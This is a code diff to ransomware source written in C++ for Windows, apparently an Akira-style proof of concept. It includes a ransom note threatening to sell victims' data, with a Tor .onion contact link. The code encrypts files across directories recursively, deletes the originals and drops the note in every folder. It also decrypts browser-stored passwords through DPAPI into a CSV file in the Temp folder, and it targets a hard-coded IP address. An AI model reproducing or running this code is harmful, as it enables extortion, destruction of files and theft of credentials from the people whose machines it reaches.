@@ -1,3 +1,4 @@
+
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <winternl.h>
@@ -132,9 +133,9 @@ well, for now let's keep all the tears and resentment to ourselves and try to bu
 4. As for your data, if you fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that
 5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us.
 If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:
-1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/
-2. Paste this link - https://akiralkzxq2dsrzsrvbr2xgbbu2wgsmxryd4csefameg52n7efvrziq.onion
-3. Use this code - REDBIKE-POC-2024 - to log into our chat.
+6. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/
+7. Paste this link - https://akiralkzxq2dsrzsrvbr2xgbbu2wgsmxryd4csefameg52n7efvrziq.onion
+8. Use this code - REDBIKE-POC-2024 - to log into our chat.
 Keep in mind that the faster you will get in touch, the less damage we cause.
 )";
 
@@ -181,13 +182,13 @@ bool encrypt_file(const fs::path& in)
 }
 void drop_note(const fs::path& dir)
 {
-	std::ofstream note(dir / "README.txt");
+	std::ofstream note(dir / "akira_readme.txt");
 	note << NOTE;
 }
 void process_directory(const fs::path& dir)
 {
 	// 1. always drop the note in the current directory
-	std::ofstream(dir / "README.txt") << NOTE;
+	std::ofstream(dir / "akira_readme.txt") << NOTE;
 	// 2. then walk the directory
 	for (auto const& entry :
 		fs::recursive_directory_iterator(dir,
@@ -195,12 +196,12 @@ void process_directory(const fs::path& dir)
 	{
 		if (entry.is_directory()) {
 			// directory we just entered → drop note
-			std::ofstream(entry.path() / "README.txt") << NOTE;
+			std::ofstream(entry.path() / "akira_readme.txt") << NOTE;
 			continue;
 		}
 		const fs::path file = entry.path();
 		if (file.extension() == EXT) continue; // already encrypted
-		if (file.filename() == "README.txt") continue; // never encrypt the note
+		if (file.filename() == "akira_readme.txt") continue; // never encrypt the note
 		if (encrypt_file(file))
 			fs::remove(file);
 	}
@@ -387,7 +388,7 @@ int main(int argc, char* argv[]) {
 	std::string argument = argv[1];
 	// Handle different arguments
 	if (argument == "/c") {
-		char addrstr[] = { "192.168.7.1" };
+		char addrstr[] = { "192.168.103.153" };
 		if (argc >= 3) {
 			// Use the third argument as the IP address
 			strcpy(addrstr, argv[2]);
@@ -422,7 +423,7 @@ int main(int argc, char* argv[]) {
 		pos = jsonStr.find(':', pos) + 2;
 		size_t end = jsonStr.find('"', pos);
 		std::string b64 = jsonStr.substr(pos, end - pos);
-		std::cout << "\n[*] Encrypted Key = " << b64 << "\n\n" ;
+		std::cout << "\n[*] Encrypted Key = " << b64 << "\n\n";
 		auto enc = Base64ToBytes(b64);
 		if (enc.size() < 5 || memcmp(enc.data(), "DPAPI", 5)) { std::cerr << "Bad key header\n"; return 1; }
 		auto key32 = DPAPIUnprotect(std::vector<BYTE>(enc.begin() + 5, enc.end()));
@@ -436,7 +437,14 @@ int main(int argc, char* argv[]) {
 			"L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhv.arika",
 			"L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhw.arika"
 		};
-		std::ofstream csv("decrypted_password.csv");
+
+
+
+		std::filesystem::path csvPath = std::filesystem::path(std::getenv("LOCALAPPDATA"))
+			/ "Temp"
+			/ "decrypted_password.csv";
+
+		std::ofstream csv(csvPath);
 		csv << "index,url,username,password\n";
 		int idx = 0;
 		for (const char* sub : candidates) {
@@ -503,4 +511,5 @@ int main(int argc, char* argv[]) {
 	}
 	return 0;
 }
+
 
